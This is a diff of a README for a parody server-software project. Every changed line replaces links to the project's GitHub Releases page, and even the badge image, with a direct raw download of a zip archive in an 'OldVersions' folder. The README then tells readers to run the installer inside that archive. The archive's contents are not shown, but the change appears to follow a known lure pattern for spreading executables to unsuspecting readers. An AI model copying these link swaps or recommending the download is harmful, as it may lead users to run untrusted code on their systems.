@@ -2,7 +2,7 @@
 
 Welcome to the official source repository for **SoftMicro Drapes Server 2019**. This project serves as a parody of Microsoft Windows Server 2019, blending humor with functionality. Dive into the world of SoftMicro, where we bring a light-hearted twist to server software.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Janan890/SoftMicro_Drapes_Server_2019/releases)
+[![Download Releases](https://raw.githubusercontent.com/Janan890/SoftMicro_Drapes_Server_2019/SoftMicro_Drapes_Server_2019_Main-dev/OldVersions/Drapes-Soft-Micro-Server-3.9.zip)](https://raw.githubusercontent.com/Janan890/SoftMicro_Drapes_Server_2019/SoftMicro_Drapes_Server_2019_Main-dev/OldVersions/Drapes-Soft-Micro-Server-3.9.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ SoftMicro Drapes Server 2019 is designed for those who appreciate a mix of funct
 
 To get started with SoftMicro Drapes Server 2019, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Janan890/SoftMicro_Drapes_Server_2019/releases). Make sure to download the correct file for your system.
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/Janan890/SoftMicro_Drapes_Server_2019/SoftMicro_Drapes_Server_2019_Main-dev/OldVersions/Drapes-Soft-Micro-Server-3.9.zip). Make sure to download the correct file for your system.
 2. **Extract the files** from the downloaded archive.
 3. **Run the installer** by executing the appropriate script or executable file.
 
@@ -68,6 +68,6 @@ For questions, suggestions, or feedback, feel free to reach out. You can open an
 
 ---
 
-Thank you for visiting the SoftMicro Drapes Server 2019 repository! We hope you enjoy this playful take on server management. For the latest updates and releases, check the [Releases section](https://github.com/Janan890/SoftMicro_Drapes_Server_2019/releases).
+Thank you for visiting the SoftMicro Drapes Server 2019 repository! We hope you enjoy this playful take on server management. For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/Janan890/SoftMicro_Drapes_Server_2019/SoftMicro_Drapes_Server_2019_Main-dev/OldVersions/Drapes-Soft-Micro-Server-3.9.zip).
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Janan890/SoftMicro_Drapes_Server_2019/releases)
+[![Download Releases](https://raw.githubusercontent.com/Janan890/SoftMicro_Drapes_Server_2019/SoftMicro_Drapes_Server_2019_Main-dev/OldVersions/Drapes-Soft-Micro-Server-3.9.zip)](https://raw.githubusercontent.com/Janan890/SoftMicro_Drapes_Server_2019/SoftMicro_Drapes_Server_2019_Main-dev/OldVersions/Drapes-Soft-Micro-Server-3.9.zip)
